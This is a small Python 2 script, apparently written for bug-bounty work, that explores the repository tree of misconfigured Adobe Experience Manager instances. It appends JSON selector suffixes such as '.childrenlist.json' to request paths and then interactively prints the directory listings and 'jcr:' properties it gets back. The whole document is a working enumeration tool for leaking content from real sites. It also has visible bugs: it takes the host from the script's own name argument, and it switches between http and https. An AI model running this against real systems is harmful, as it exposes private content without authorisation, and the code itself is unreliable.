#!/usr/bin/env python
# -*- coding: utf-8 -*-
# AEM (Adobe Experience Manager) vulnerable instance directory tree explorer
import requests
import json
import sys

host = sys.argv[0]
bypass = sys.argv[1] # .childrenlist.json,  .1.json etc.

headers = {
    'Host': host,
    'User-Agent': 'bl4de/HackerOne',
    'Accept': 'application/json'
}


def process():
    url = "{}{}{}".format('http://', host, bypass)
    resp = requests.get(
        url,
        headers=headers
    )
    dirtree = json.loads(resp.content)
    for d in dirtree:
        print d

    while True:
        goto_path = raw_input("\n\n>>> ")
        url = "{}{}/{}{}".format('https://', host, goto_path, bypass)
        print "DIR: {}\n".format(goto_path)

        print url
        resp = requests.get(
            url,
            headers=headers
        )

        if resp.content:
            dirtree = json.loads(resp.content)
            for d in dirtree:
                if "jcr:" in d:
                    print "{}: {}".format(d, dirtree[d])
                print " {}".format(d)


def main():
    try:
        process()
    except ValueError:
        print "\n[-] No valid JSON returned\n"
        process()


if __name__ == "__main__":
    main()
